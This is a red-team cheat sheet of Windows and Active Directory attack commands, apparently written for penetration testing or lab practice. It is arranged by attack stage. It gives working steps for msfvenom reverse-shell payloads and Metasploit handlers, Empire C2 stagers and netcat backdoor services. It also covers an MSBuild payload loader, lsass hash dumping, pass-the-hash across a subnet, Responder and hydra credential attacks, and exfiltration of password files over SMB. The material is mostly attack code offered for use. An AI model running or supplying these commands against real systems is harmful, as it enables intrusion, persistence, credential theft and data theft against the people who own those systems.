# Reconnaissance

### dnsrecon
```bash
dnsrecon -d "$TARGET" -n "$DNS_SERVER"
```

### Massscan
```bash
# text goes here
```

### Nmap
```bash
# text goes here
```

# Initial Access

## SMB
### smbclient
```bash
smbclient //192.168.1.69/c$ -U john Password123!
# NT_STATUS_ACCESS_DENIED may indicate the credentials are wrong or network access is restricted
```

## RDP
### Enable RDP Remotely
```bash
# enter the command below on one line 
PsExec.exe /accepteula \\192.168.1.69 \
  reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" \
  /v fDenyTSConnections /t REG_DWORD /d 0 /f
```


# Execution

## Metasploit, MSFVenom, and Meterpreter
**Metasploit**
```bash
# attacker: terminal 1
sudo msfconsole 
use exploit/multi/handler
set LHOST 192.168.1.23
set LPORT 443
set PAYLOAD windows/meterpreter/reverse_tcp
options # check your exploit settings
run
```

**MSFVenom**
```bash
# attacker: terminal 2
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.23 LPORT=443 -f exe -o rshell.exe
sudo python3 -m http.server 8000
# get the target to download and execute the payload
```

**Meterpreter**  
Change exploits to `post/windows/gather/hashdump`. 
```bash
# attacker: terminal 1 (after a shell has been opened)
background                       # put session into the background 
sessions                         # confirm session number
use post/windows/gather/hashdump # change exploits
set SESSION 1                    # specify the session to use
options                          # check your exploit settings
run                              # dumps password hints and hashes
sessions -k 1                    # kill the session 
```

If there was an error about needing a SYSTEM user context, run the commands below. 
```bash
sessions -i 1                    # interact with session 1
ps                               # list processes (look for lsass, explorer, etc.)
migrate 666                      # migrate to lsass process (PID 666)
background                       # try and run the 'hashdump' exploit above again
```

## Empire, Python, and Seatbelt
Start Empire. 
```bash
# attacker Terminal 1:
cd empire/
sudo ./ps-empire server
```
```bash
# attacker Terminal 2:
cd Empire/
sudo ./ps-empire client
```

Configure and start a listener. 
```bash
# attacker Terminal 2:
uselistener http
set Name handler_http 
set Port 4444
set Host 192.168.1.23
set defaultdelay 1 # seconds between agent check-in
execute            # to modify a listener, disable it and run "editlistener" (regenerate your stager too)
```

Configure and create a stager (upon execution, the stager will download and start a C2 agent). 
```bash
# attacker Terminal 2:
usestager windows/launcher_bat
set Listener handler_http
execute # the stager will be written to empire/client/generated-stagers/
```

Host the stager so it can be downloaded by the target. 
```bash
# attacker Terminal 3:
cd empire/client/generated-stagers/
sudo python3 -m http.server 9001
# get the target to download and execute the stager (launcher.bat)
```

Pick and run a PowerShell Empire module. 
```bash
# attacker Terminal 2:
agents
interact WOW12345
usemodule powershell/situational_awareness/host/seatbelt
set Agent WOW12345
set Command -group=user # enum more info about the current user for privesc
execute 
# wait and then review the results printed to the screen
```

## Sliver
```bash
# text goes here
```

# Persistence

## sc
```bash
# target Terminal 1:
sc \\192.168.1.69 create backdoor binpath= "cmd.exe /k c:\malware\nc.exe -dlp 4444 -e cmd.exe"
sc \\192.168.1.69 start backdoor
```

## wmic
```bash
# target Terminal 2:
wmic node:192.168.1.69 process call create "c:\malware\nc.exe -dlp 4444 -e cmd.exe"
```

## MSFVenom, Metasploit, and MSBuild
Identify the correct MSBuild version for the target. 
```bash
# target Terminal 1:
dir /b /s C:\msbuild.exe
```

Create the payload. 
```bash
# attacker Terminal 1:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.23 LPORT=4444 -f charp -O payload.cs
```

Add the payload to a MSBuild XML file (see below). Then, get the XML file onto the target. 
```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Demo">
   <MSBuildShell/>
  </Target>
   <UsingTask
    TaskName="Demo"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <!-- Double-check the path above this line! -->
    <Task>	
      <Code Type="Class" Language="cs">
      <!-- Payload generated by MSFVenom -->
      </Code>
    </Task>
  </UsingTask>
</Project>
```

Start a handler. 
```bash
# attacker: terminal 1
sudo msfconsole 
use exploit/multi/handler
set LHOST 192.168.1.23
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp
options # check your exploit settings
run
```

Host the exploit so the target can download it. 
```bash
# attacker Terminal 2:
sudo python3 -m http.server 8000
```

Get the target to execute the exploit. 
```bash
# target Terminal 1:
C:\Windows\Microsoft.NET\path\to\MSBuild.exe C:\rshell.xml
```



# Privilege Escalation

### Bloodhound
BloodHound is a tool for reviewing privilege escalation paths within Active Directory and Entra ID environments. The graphs shown are generated using data collected by SharpHound and AzureHound. 
```bash
cd Bloodhound-win32-x64/
BloodHound.exe
# login (neo4j:BloodHound) 
# use one of the options below to discover a path to privesc
```
Option 1: use a pre-built query. 
```bash
# enter the name of an entity in the search bar (top-left) 
# right-click entity and select "Mark User as Owned"
# click "Queries" > "Shortest Paths to Domain Admins from Owned Principals"
# pick a Domain Admins group
# review path to privesc
# privesc will require connecting to machines and dumping creds from LSASS
```
Option 2: specify a target node. 
```bash
# enter the name of an entity in the search bar (top-left) 
# click the "Pathfinding" icon
# enter the name of a Domain Admins group and click "Find Path"
# click "Change Layout" (right-side)
# review path to privesc 
```

## Unquoted Service Paths
### beRoot
```bash
beRoot.exe # identify privesc options
# look for "[!] Path containing spaces without quotes"
```

### PowerUp
The default exploit used by PowerUp's "Write-ServiceBinary" function creates a local administrator. Use the `-Command` to specify a different exploit. If the unquoted path of your target service is `C:\Program Files\Vuln Server\VulnServer.exe`, the string you would use with `Write-ServiceBinary` is `C:\Program Files\Vuln.exe`. 
```bash
# target Terminal 1:
Import-Module .\PowerUp.ps1
Invoke-AllChecks
# look for "[*] Checking for unquoted service paths"
# pick vulnerable service and copy/paste the string in its "AbuseFunction" field
Write-ServiceBinary -Name "Vuln Server" -Path "C:\Program Files\Vuln.exe"
# check your exploit settings and then get the target to restart (e.g., shutdown /r /t 0)
# login to the target using "john" and "Password123!"
```


# Credential Access

## NTLMv1
SAM and NTDS.dit files contain unsalted NT hashes and are used in NTLMv1 challenge/responses. These hashes can be cracked or used in Pass-the-Hash attacks.

### Metasploit, MSFVenom, Meterpreter, and John
```bash
# setup a handler using Metasploit
# create a Meterpreter-based payload using MSFVenom
# get the target to download and execute the payload
# configure and run the post/windows/gather/hashdump exploit in Metasploit
vim hash.txt # save hash dump to a file
john --format=nt hash.txt # crack the hash
john --format=nt --show hash.txt      # show the password
```

## NTLMv2
NTLMv2 challenge/responses cannot. 

### Responder and John
```bash
sudo Responder.py -I eth0 
# wait for Responder to reply to a LLMNR request 
# then, check Responder's log directory for the NTLMv2 hash obtained 
cat responder/logs/SMB-NTLMv2-SSP-*.txt
john --format=netntlmv2 responder/logs/SMB-NTLMv2-SSP-*.txt # crack the hash
john --show responder/logs/SMB-NTLMv2-SSP*.txt              # show the password
```

### Tcpdump, Pcredz, and Hashcat
```bash
sudo tcpdump -ni eth0 port 445 -w /tmp/traffic.pcap
# wait for someone to auth via SMB to a Windows machine
sudo Pcredz -vf traffic.pcap
# use /tmp to avoid a segmentation fault
# check Pcredz's log directory for the NTLMv2 hash obtained
cat pcredz/logs/NTLMv2.txt
hashcat -a0 -m5600 -w3 pcredz/logs/NLTMV2.txt                   # crack the hash
hashcat -m5600 pcredz/logs/NTLMv2.txt --show --outfile-format 2 # show the password
```

## SSH
### Hydra
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET -t4 ssh
```

## HTTP
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET \
  http-post-form "/phpmyadmin/index.php?:pma_username=^USER^&pma_password=^PASS^:Cannot|without"
```


# Lateral Movement

## Impacket
### wmiexec.py
`wmicexec.py` connects to DCOM ports (i.e., the WMI service) on the target. 
```bash
# attacker Terminal 1:
wmiexec.py john@target whoami     # specify a single command to run
wmiexec.py john@target            # invoke a semi-interactive shell
```

### smbexec.py
`smbexec.py` connects to SMB ports on the target. 
```bash
# attacker Terminal 1:
smbexec.py john@target            # invoke a semi-interactive shell
# use the full-path to change directories
```

### lookupsid.py 
`lookupsid.py` enumerates local and domain accounts (i.e., their RIDs and usernames). 
```bash
# attacker Terminal 1:
lookupsid.py 192.168.1.69              # use an anonymous/null session
lookupsid.py john@192.168.1.69         # use a local account
lookupsid.py evilcorp/elliot@192.168.1.5 # use a domain account on a domain controller
```

## Pass-the-Hash
### Metasploit and PsExec 
Login to target 1 using `exploit/windows/smb/psexec`. 
```bash
# attacker Terminal 1:
msfconsole 
use exploit/windows/smb/psexec
set SMBDOMAIN evilcorp
set SMBUSER john
set SMBPASSWORD Password123!
set RHOST 192.168.1.69
options
run
```

Change exploits to `post/windows/gather/hashdump` and dump the hashes stored in memory.
```bash
# attacker Terminal 1: (after a shell has been opened)
background                       # put the SMB session in the background
use post/windows/gather/hashdump # change exploits
set SESSION 1                    # configure your exploit to use the SMB session in the background
options                          # check your exploit settings
run                              # dumps password hints and hashes
```

Attempt to login to other targets previously identified using one of the usernames and hashes you just dumped. 
```bash
use exploit/windows/smb/psexec
set SMBDOMAIN evilcorp
set SMBUSER elliot
set SMBPASSWORD 1a8d397270a1c210c7de787d4d082cf4
set RHOSTS 192.168.1.61,62,63,64,65,66,67,68,69
options
run
```

## SSH
```bash
# attacker Terminal 1:
# any connections to port 4444 on .69 get forwarded to port 445 on .5
ssh john@192.168.1.69 -L 4444:192.168.1.5:445
```

# Exfiltration

## smbclient
```bash
# attacker Terminal 1:
mkdir loot               # make a dir for loot
cd loot                  # change to loot dir
smbclient //192.168.1.69/c$ -U john Password123! # login
cd users\victor\desktop  # its case insensitive
dir                      # list files to exfil
mget passwords.txt       # download a file
exit
```

## Impacket
### smbclient.py
`smbclient.py` also connects to SMB ports on the target. 
```bash
# attacker Terminal 1:
# use this syntax to specify a domain account: "domain/username"
smbclient.py evilcorp/john@target # invoke a semi-interactive shell
use restrictedfolder 
get passwords.txt
exit
```


